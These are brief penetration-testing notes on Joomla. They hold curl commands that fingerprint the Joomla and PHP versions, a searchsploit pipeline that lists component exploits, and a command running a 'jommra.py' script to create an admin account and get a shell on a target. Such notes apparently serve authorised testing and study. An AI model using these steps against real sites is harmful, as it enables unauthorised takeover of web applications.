## Joomla Version
Most recent versions of Joomla contains a "joomla.xml" file within the "/administrator/manifests/files" directory, which is readable without authentication to the application.

```bash
curl -s http://<target-joomla>/administrator/manifests/files/joomla.xml | grep "<version>" | grep -Po "(\d+\.)+\d+"
```

## Joomla PHP version
```bash
curl -sSL -D - http://<target-joomla>/index.php -o /dev/null | grep "X-Powered-By"
```

## Joomla Extensions
```bash
searchsploit "Joomla" | grep "com_" | cit -f3 -d" " >> comptotestdb.txt

```

## Jommra.py to add admin account and pop shell
```bash
python jommra.py -u user -p userpass55 -e email@foo http://<target-joomla>/joomla
```
![[Pasted image 20220218033747.png]]